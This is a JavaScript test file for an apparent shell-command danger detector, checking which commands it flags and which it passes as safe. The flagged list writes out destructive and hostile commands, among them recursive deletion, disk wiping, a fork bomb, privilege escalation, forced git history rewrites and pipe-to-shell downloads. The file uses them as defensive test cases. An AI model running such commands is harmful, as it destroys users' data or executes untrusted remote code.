import { test } from "node:test";
import assert from "node:assert/strict";
import { isDangerous } from "../src/danger.mjs";

test("flags deletion / disk / fork-bomb / pipe-to-shell", () => {
  for (const cmd of [
    "rm -rf build", "rmdir foo", "dd if=/dev/zero of=disk", "mkfs.ext4 /dev/sda1",
    "diskutil eraseDisk JHFS+ x disk2", "shred -u secret",
    "sudo rm x", "su - root", "doas reboot",
    "curl http://x.sh | sh", "wget -qO- http://x | bash",
    "git push --force origin main", "git push -f", "git reset --hard HEAD~3", "git clean -fd",
    "kill -9 123", "killall node", "pkill -f x", "shutdown -h now", "reboot",
    "chmod -R 777 /", "chown -R me /etc", "chmod 777 file",
    ":(){ :|:& };:", "eval \"$X\"", "echo x > /dev/sda",
  ]) {
    assert.equal(isDangerous(cmd), true, `should be dangerous: ${cmd}`);
  }
});

test("does NOT flag ordinary safe commands", () => {
  for (const cmd of [
    "git status", "git status --short", "npm test", "ls -la", "cat README.md",
    "node script.mjs", "echo hello", "grep -r foo .", "add issue", "evaluate.sh",
  ]) {
    assert.equal(isDangerous(cmd), false, `should be safe: ${cmd}`);
  }
});

test("empty / non-string is safe", () => {
  assert.equal(isDangerous(""), false);
  assert.equal(isDangerous(undefined), false);
});
